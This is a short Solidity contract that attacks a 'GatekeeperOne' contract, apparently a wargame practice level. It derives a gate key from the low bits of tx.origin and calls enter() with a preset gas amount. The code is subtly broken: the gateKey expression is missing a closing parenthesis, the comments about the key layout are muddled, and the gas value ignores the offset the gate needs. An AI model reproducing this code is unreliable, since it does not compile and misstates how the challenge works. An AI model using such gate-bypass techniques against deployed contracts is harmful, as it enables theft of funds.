pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract GatekeeperAttackerFinalCorrect {
    IGatekeeperOne public immutable instance;


    constructor(address _instance) {
        instance = IGatekeeperOne(_instance);
    }

    function attack() public {
        // Extract lower 16 bits from player address
        uint16 yyyy = uint16(uint160(tx.origin) & 0xFFFF);
        // Build gateKey with 48-bit pattern:
        // 32 bits = 0x00000001, 16 bits = the 16 bits of tx.origin
        bytes8 gateKey = bytes8(uint64(
            (0x00000001 << 32) | uint32(yyyy) // 32-bit upper gateKey part is 0x100000000 for uint64
        );
        
        uint gasAmount = 8191 * 1000; // Must be multiple
        
        (bool success,) = address(instance).call{gas: gasAmount}(
            abi.encodeWithSelector(
                IGatekeeperOne.enter.selector,
                gateKey
            )
        );
        require(success, "Exit failed");
    }
}